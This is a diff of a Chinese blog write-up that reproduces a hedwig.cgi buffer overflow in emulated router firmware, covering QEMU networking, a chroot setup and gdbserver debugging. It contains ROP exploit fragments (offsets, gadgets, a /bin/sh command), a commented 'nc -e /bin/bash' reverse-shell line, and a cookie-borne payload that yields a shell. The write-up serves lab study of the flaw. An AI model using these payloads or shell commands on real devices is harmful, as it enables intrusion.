@@ -203,7 +203,7 @@ binwalk -Me xxx.bin 找到漏洞文件路径：/htdocs/web/hedwig.cgi
 </span></span><span style="display:flex;"><span>system_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x53200</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
 </span></span><span style="display:flex;"><span>gadget1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x159cc</span>
 </span></span><span style="display:flex;"><span>gadget2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x158C8</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#cmd = b&#34;nc -e /bin/bash 192.168.100.254 9999&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#cmd = b&#34;nc -e /bin/bash  9999&#34;</span>
 </span></span><span style="display:flex;"><span>cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>
 </span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">1009</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">36</span>)
 </span></span><span style="display:flex;"><span>data <span style="color:#f92672">+=</span> p32(libc_base<span style="color:#f92672">+</span>system_offset) <span style="color:#75715e">#s0</span>
@@ -266,25 +266,25 @@ binwalk -Me xxx.bin 找到漏洞文件路径：/htdocs/web/hedwig.cgi
 </span></span><span style="display:flex;"><span> <span style="color:#75715e"># 1</span>
 </span></span><span style="display:flex;"><span> <span style="color:#75715e"># 这两句不能断开</span>
 </span></span><span style="display:flex;"><span>brctl addbr br0
-</span></span><span style="display:flex;"><span> ifconfig br0 up
+</span></span><span style="display:flex;"><span> <span style="color:#75715e">#ifconfig br0 up</span>
 </span></span><span style="display:flex;"><span> <span style="color:#75715e"># or</span>
-</span></span><span style="display:flex;"><span> <span style="color:#75715e">#ip link set br0 up</span>
+</span></span><span style="display:flex;"><span>ip link set br0 up
 </span></span><span style="display:flex;"><span> <span style="color:#75715e"># 2</span>
-</span></span><span style="display:flex;"><span> brctl addif br0 ens33
-</span></span><span style="display:flex;"><span> ifconfig ens33 0.0.0.0
+</span></span><span style="display:flex;"><span>brctl addif br0 ens33
+</span></span><span style="display:flex;"><span> <span style="color:#75715e">#ifconfig ens33 0.0.0.0</span>
 </span></span><span style="display:flex;"><span> <span style="color:#75715e"># or</span>
-</span></span><span style="display:flex;"><span> <span style="color:#75715e">#ip addr add 0.0.0.0 dev ens33</span>
+</span></span><span style="display:flex;"><span>ip addr add 0.0.0.0 dev ens33
 </span></span><span style="display:flex;"><span> <span style="color:#75715e"># 3</span>
 </span></span><span style="display:flex;"><span>dhclient br0
 </span></span><span style="display:flex;"><span> <span style="color:#75715e"># 4</span>
-</span></span><span style="display:flex;"><span> tunctl -t tap0 -u <span style="color:#e6db74">`</span>whoami<span style="color:#e6db74">`</span>
-</span></span><span style="display:flex;"><span> ifconfig tap0 up
+</span></span><span style="display:flex;"><span>tunctl -t tap0 -u <span style="color:#e6db74">`</span>whoami<span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#ifconfig tap0 up</span>
 </span></span><span style="display:flex;"><span> <span style="color:#75715e"># or</span>
-</span></span><span style="display:flex;"><span> <span style="color:#75715e">#ip link set tap0 up</span>
-</span></span><span style="display:flex;"><span> brctl addif br0 tap0
+</span></span><span style="display:flex;"><span>ip link set tap0 up
+</span></span><span style="display:flex;"><span>brctl addif br0 tap0
 </span></span><span style="display:flex;"><span> <span style="color:#75715e"># 5</span>
-</span></span><span style="display:flex;"><span> echo <span style="color:#e6db74">&#34;qemu start &#34;</span>
-</span></span><span style="display:flex;"><span> sudo qemu-system-mipsel -M malta -kernel ./vmlinux-3.2.0-4-4kc-malta -hda ./debian_squeeze_mipsel_standard.qcow2 -append <span style="color:#e6db74">&#34;root=/dev/sda1 console=tty0&#34;</span> -net nic -net tap,ifname<span style="color:#f92672">=</span>tap0,script<span style="color:#f92672">=</span>no,downscript<span style="color:#f92672">=</span>no -nographic
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;qemu start &#34;</span>
+</span></span><span style="display:flex;"><span>sudo qemu-system-mipsel -M malta -kernel ./vmlinux-3.2.0-4-4kc-malta -hda ./debian_squeeze_mipsel_standard.qcow2 -append <span style="color:#e6db74">&#34;root=/dev/sda1 console=tty0&#34;</span> -net nic -net tap,ifname<span style="color:#f92672">=</span>tap0,script<span style="color:#f92672">=</span>no,downscript<span style="color:#f92672">=</span>no -nographic
 </span></span></code></pre></div><p>等待启动完成，qemu的默认登录为：root/root，登录后使用ifconfig查看网卡信息——如果此时eth0网卡存在但没有IP，可以使用<strong>ifconfig eth0 ip/24 up</strong>手动分配ip，注意要和宿主机在同一网卡下。</p>
 <p><img src="https://pic-one1.oss-cn-beijing.aliyuncs.com/typroa/202407111459768.png?x-oss-process=style/zzz" alt="image-20240711145923567"></p>
 <p>互相测试能否ping通</p>
@@ -373,19 +373,19 @@ binwalk -Me xxx.bin 找到漏洞文件路径：/htdocs/web/hedwig.cgi
 </span></span></code></pre></div><h5 id="324开启物理机转发功能">3.2.4开启物理机转发功能</h5>
 <p>在宿主机中新建以下net_conf_host.sh脚本并执行：</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#! /bin/sh
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> sudo sysctl -w net.ipv4.ip_forward<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
-</span></span><span style="display:flex;"><span> sudo iptables -F
-</span></span><span style="display:flex;"><span> sudo iptables -X
-</span></span><span style="display:flex;"><span> sudo iptables -t nat -F
-</span></span><span style="display:flex;"><span> sudo iptables -t nat -X
-</span></span><span style="display:flex;"><span> sudo iptables -t mangle -F
-</span></span><span style="display:flex;"><span> sudo iptables -t mangle -X
-</span></span><span style="display:flex;"><span> sudo iptables -P INPUT ACCEPT
-</span></span><span style="display:flex;"><span> sudo iptables -P FORWARD ACCEPT
-</span></span><span style="display:flex;"><span> sudo iptables -P OUTPUT ACCEPT
-</span></span><span style="display:flex;"><span> sudo iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE
-</span></span><span style="display:flex;"><span> sudo iptables -I FORWARD <span style="color:#ae81ff">1</span> -i tap0 -j ACCEPT
-</span></span><span style="display:flex;"><span> sudo iptables -I FORWARD <span style="color:#ae81ff">1</span> -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>sudo sysctl -w net.ipv4.ip_forward<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>sudo iptables -F
+</span></span><span style="display:flex;"><span>sudo iptables -X
+</span></span><span style="display:flex;"><span>sudo iptables -t nat -F
+</span></span><span style="display:flex;"><span>sudo iptables -t nat -X
+</span></span><span style="display:flex;"><span>sudo iptables -t mangle -F
+</span></span><span style="display:flex;"><span>sudo iptables -t mangle -X
+</span></span><span style="display:flex;"><span>sudo iptables -P INPUT ACCEPT
+</span></span><span style="display:flex;"><span>sudo iptables -P FORWARD ACCEPT
+</span></span><span style="display:flex;"><span>sudo iptables -P OUTPUT ACCEPT
+</span></span><span style="display:flex;"><span>sudo iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE
+</span></span><span style="display:flex;"><span>sudo iptables -I FORWARD <span style="color:#ae81ff">1</span> -i tap0 -j ACCEPT
+</span></span><span style="display:flex;"><span>sudo iptables -I FORWARD <span style="color:#ae81ff">1</span> -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT
 </span></span></code></pre></div><p>之后，再在qemu虚拟机的squashfs-root目录下创建init.sh的脚本进行初始化操作：</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>echo <span style="color:#ae81ff">0</span> &gt; /proc/sys/kernel/randomize_va_space
@@ -414,7 +414,7 @@ binwalk -Me xxx.bin 找到漏洞文件路径：/htdocs/web/hedwig.cgi
 </span></span><span style="display:flex;"><span>./httpd -f http_conf
 </span></span></code></pre></div><p>通过以下命令切换根目录</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>mount -o bind /dev ./squashfs-root/dev/
-</span></span><span style="display:flex;"><span> mount -t proc /proc/ ./squashfs-root/proc/
+</span></span><span style="display:flex;"><span>mount -t proc /proc/ ./squashfs-root/proc/
 </span></span><span style="display:flex;"><span>chroot squashfs-root bash
 </span></span></code></pre></div><p>但是squashfs-root目录下并无bash，静态编译一个mips架构的bash放进去。</p>
 <p>如果报错没有PID文件，自己手动创建一个文件，只要PID不和已有的重复就行。</p>
@@ -427,6 +427,27 @@ binwalk -Me xxx.bin 找到漏洞文件路径：/htdocs/web/hedwig.cgi
 </span></span><span style="display:flex;"><span>mv /etc_bak/etc /etc
 </span></span><span style="display:flex;"><span>rm -rf /etc_bak
 </span></span></code></pre></div><h5 id="325-复现">3.2.5 复现</h5>
+<p>​        在物理机上运行exp.py，将静态编译的gdbserver、生成的payload上传到qemu虚拟机中。</p>
+<p>注：系统模式和用户模式的基址可能是不同的</p>
+<p><img src="https://pic-one1.oss-cn-beijing.aliyuncs.com/typroa/202407171512946.png?x-oss-process=style/zzz" alt="image-20240717151234833"></p>
+<p>执行以下脚本启动gdbserver调试</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>export CONTENT_LENGTH<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;100&#34;</span>
+</span></span><span style="display:flex;"><span>export CONTENT_TYPE<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;application/x-www-form-urlencoded&#34;</span>
+</span></span><span style="display:flex;"><span>export HTTP_COOKIE<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;uid=`cat payload`&#34;</span>
+</span></span><span style="display:flex;"><span>export REQUEST_METHOD<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span>
+</span></span><span style="display:flex;"><span>export REQUEST_URI<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/hedwig.cgi&#34;</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;uid=1234&#34;</span>|./gdbserver.mipsle 192.168.182.12:6666 /htdocs/web/hedwig.cgi
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#unset CONTENT_LENGTH</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#unset CONTENT_TYPE</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#unset HTTP_COOKIE</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#unset REQUEST_METHOD</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#unset REQUEST_URI</span>
+</span></span></code></pre></div><p>直接在虚拟机里启动该脚本，物理机启动一个端口监听，gdb连接上直接c即可获得shell</p>
+<p><img src="https://pic-one1.oss-cn-beijing.aliyuncs.com/typroa/202407171511288.png?x-oss-process=style/zzz" alt="image-20240717151127161"></p>
+<p><img src="https://pic-one1.oss-cn-beijing.aliyuncs.com/typroa/202407171511236.png?x-oss-process=style/zzz" alt="image-20240717151147134"></p>
+<h3 id="参考">参考</h3>
+<p>[]: <a href="https://bbs.kanxue.com/thread-272318.htm#msg_header_h3_8">https://bbs.kanxue.com/thread-272318.htm#msg_header_h3_8</a>
+[]: <a href="https://bbs.kanxue.com/thread-263758.htm">https://bbs.kanxue.com/thread-263758.htm</a></p>
 
     </div>
     <div class="post-footer">
